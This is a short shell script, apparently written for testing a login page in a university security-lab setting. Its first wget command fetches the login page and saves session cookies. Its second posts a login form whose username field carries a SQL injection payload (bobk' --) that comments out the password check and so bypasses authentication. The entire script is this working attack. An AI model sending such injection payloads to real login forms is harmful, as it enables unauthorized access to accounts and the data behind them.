#!/bin/sh

#get the login page
wget -a log.txt --keep-session-cookies --save-cookies cookies.txt "http://calculus.sisl.rites.uic.edu:443/5f3decd5/empldir/empldirFix/Login.jsp"

#enter login credentials
wget -a log.txt --load-cookies cookies.txt --post-data 'FormName=Login&Login=bobk%27+--+&Password=1234&FormAction=login' "http://calculus.sisl.rites.uic.edu:443/5f3decd5/empldir/empldirFix/Login.jsp"

